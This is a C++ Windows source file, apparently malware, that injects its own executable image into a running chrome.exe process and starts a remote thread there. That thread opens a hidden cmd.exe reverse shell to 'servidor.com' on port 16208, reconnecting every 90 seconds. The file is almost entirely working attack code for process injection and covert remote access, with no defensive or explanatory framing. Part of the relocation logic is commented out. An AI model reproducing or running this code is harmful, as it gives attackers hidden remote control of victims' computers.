#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define __STDC_WANT_LIB_EXT1__ 1

#include <winsock2.h>
#include <iostream>
#include "Windows.h"
#include <tlhelp32.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_PORT 16208
#define DEFAULT_IP "servidor.com"

DWORD get_process_id(const wchar_t* name)
{
    
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    pe32.dwSize = sizeof(PROCESSENTRY32);

    do {
        if (!wcscmp(pe32.szExeFile, name))
            return pe32.th32ProcessID;
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

}

DWORD WINAPI thread_1(LPVOID p) {
    WSADATA wsaData;
    SOCKET Winsocket;
    STARTUPINFO theProcess;
    PROCESS_INFORMATION info_proc;
    struct sockaddr_in Winsocket_Structure;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    while(true){
        ZeroMemory(&theProcess, sizeof(theProcess));
        ZeroMemory(&info_proc, sizeof(info_proc));

        Winsocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        struct hostent* host;
        host = gethostbyname(DEFAULT_IP);

    
        Winsocket_Structure.sin_port = htons(DEFAULT_PORT);
        Winsocket_Structure.sin_family = AF_INET;
        Winsocket_Structure.sin_addr.s_addr = *((unsigned long*)host->h_addr);

        if (Winsocket == INVALID_SOCKET)
            {
                WSACleanup();
                return FALSE;
            }
        
        // Faz a conexão com client
    
        if (WSAConnect(Winsocket, (SOCKADDR*)&Winsocket_Structure, sizeof(Winsocket_Structure), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            WSACleanup();
        }
        else {

            theProcess.cb = sizeof(theProcess);
            theProcess.dwFlags = STARTF_USESTDHANDLES;
            theProcess.hStdInput = (HANDLE)Winsocket;
            theProcess.hStdOutput = (HANDLE)Winsocket;
            theProcess.hStdError = (HANDLE)Winsocket;
            wchar_t titlew[20] = L"SYSTEM32";
            theProcess.lpTitle = titlew;
            theProcess.wShowWindow = SW_HIDE;

            wchar_t wtext[32] = L"cmd.exe";
            
            CreateProcess(NULL, wtext, NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc);
            ShowWindow(FindWindow(NULL, titlew), SW_HIDE);
            WaitForSingleObject(info_proc.hProcess, INFINITE);
            CloseHandle(info_proc.hProcess);
            CloseHandle(info_proc.hThread);
            Sleep(90000);

        }
    }
    return 0;
}

int main(int argc, char *argv[])
{

    PIMAGE_NT_HEADERS pINH;
    PIMAGE_DATA_DIRECTORY pIDD;
    PIMAGE_BASE_RELOCATION pIBR;

    HMODULE hModule;
    HANDLE hProcess, hThread;
    PVOID image, mem;
    DWORD i, count;
    DWORD_PTR delta, OldDelta;
    LPWORD list;
    PDWORD_PTR p;

    wchar_t nameProc[] = L"chrome.exe";
    DWORD dwPid = get_process_id(nameProc);

    hModule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hModule;
    pINH = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pIDH->e_lfanew);

    std::cout << "Opening target process...\n";

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess)
    {
        std::cout << "Error: Unable to open target process handle.\n";
        return 1;
    }
    std::cout << "Allocating memory in the target process...\n";

    mem = VirtualAllocEx(hProcess, NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (mem == NULL)
    {
        std::cout << "Error: Unable to allocate memory in the target process. %d\n" << GetLastError();
        CloseHandle(hProcess);
        return 1;
    }

    //printf("Memory allocated. Address: %#010x\n", mem);

    image = VirtualAlloc(NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy module image in temporary buffer 
    memcpy(image, hModule, pINH->OptionalHeader.SizeOfImage);

    // Get data of .reloc section
    pIDD = &pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // Point to first relocation block copied in temporary buffer
    pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)image + pIDD->VirtualAddress);

    delta = (DWORD_PTR)((LPBYTE)mem - pINH->OptionalHeader.ImageBase);
    std::cout << std::hex << delta;
    OldDelta = (DWORD_PTR)((LPBYTE)hModule - pINH->OptionalHeader.ImageBase);
    std::cout << std::hex << OldDelta;

    /*
    // Browse all relocation blocks
    while (pIBR->VirtualAddress != 0)
    {
        // We check if the current block contains relocation descriptors, if not we skip to the next block
        if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
        {
            // We count the number of relocation descriptors
            count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            //  relocDescList is a pointer to first relocation descriptor 
            list = (LPWORD)((LPBYTE)pIBR + sizeof(IMAGE_BASE_RELOCATION));

            // For each descriptor
            for (i = 0; i < count; i++)
            {
                if (list[i] > 0)
                {

                    // Locate data that must be reallocated in buffer (data being an address we use pointer of pointer) 
                    // reloc->VirtualAddress + (0x0FFF & (list[i])) -> add botom 12 bit to block virtual address 
                    p = (PDWORD_PTR)((LPBYTE)image + (pIBR->VirtualAddress + (0x0fff & (list[i]))));
                    std::cout << std::hex << p << std::endl;
                    // Change the offset to adapt to injected module base address
                    *p -= OldDelta;
                    std::cout << std::hex << p << std::endl; 
                    *p += delta;
                    std::cout << std::hex << p << std::endl;

                }
            }
        }

        pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
    }
*/
    
    std::cout << "Writing executable image into target process...\n";
    
    if (!WriteProcessMemory(hProcess, mem, image, pINH->OptionalHeader.SizeOfImage, NULL))
    {
        std::cout << "Error: Unable to write executable image into target process\n";
        VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    std::cout << "Creating remote thread in target process...\n";
    LPTHREAD_START_ROUTINE remoteThread = (LPTHREAD_START_ROUTINE)((LPBYTE)mem + (DWORD_PTR)(LPBYTE)thread_1 - (LPBYTE)hModule);

    
    hThread = CreateRemoteThread(hProcess, NULL, 0, remoteThread, NULL, 0, NULL);
    if (!hThread)
    {
        std::cout << "Error: Unable to create remote thread in target process.\n";
        VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        VirtualFree(image, 0, MEM_RELEASE);
        return 1;
    }

    
    std::cout << "Thread successfully created! Waiting for the thread to terminate...\n";
    WaitForSingleObject(hThread, INFINITE);

    std::cout << "Thread terminated!\n";
    CloseHandle(hThread);

    std::cout << "Freeing allocated memory...\n";

    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    VirtualFree(image, 0, MEM_RELEASE);
    
    return TRUE;
}

